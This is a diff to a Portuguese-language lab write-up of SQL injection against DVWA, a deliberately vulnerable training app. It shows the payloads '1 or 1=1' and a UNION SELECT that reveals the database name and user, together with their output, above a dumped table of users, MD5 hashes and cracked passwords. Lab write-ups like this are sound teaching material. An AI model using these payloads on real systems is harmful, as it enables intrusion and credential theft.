@@ -216,3 +216,44 @@ SQL Injection (SQLi) é uma vulnerabilidade que permite a um atacante “injetar
    | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
    | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
    | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
+
+### Segurança média
+
+O SQL não usa "**'**", ou seja, é informado um inteiro para a consulta do ID. Se modificarmos ligeiramente a consulta, retirando as aspas, podemos injetar um SQL.
+
+Injeção:`1 or 1=1`
+Resposta:
+```
+ID: 1 or 1=1
+First name: admin
+Surname: admin
+
+ID: 1 or 1=1
+First name: Gordon
+Surname: Brown
+
+ID: 1 or 1=1
+First name: Hack
+Surname: Me
+
+ID: 1 or 1=1
+First name: Pablo
+Surname: Picasso
+
+ID: 1 or 1=1
+First name: Bob
+Surname: Smith
+```
+De forma similar: `1 union select database(), user() --`
+Resulta em injeção com sucesso:
+```
+ID: 1 union select database(), user() --
+First name: admin
+Surname: admin
+
+ID: 1 union select database(), user() --
+First name: dvwa
+Surname: root@localhost
+```
+E assim por diante...
+
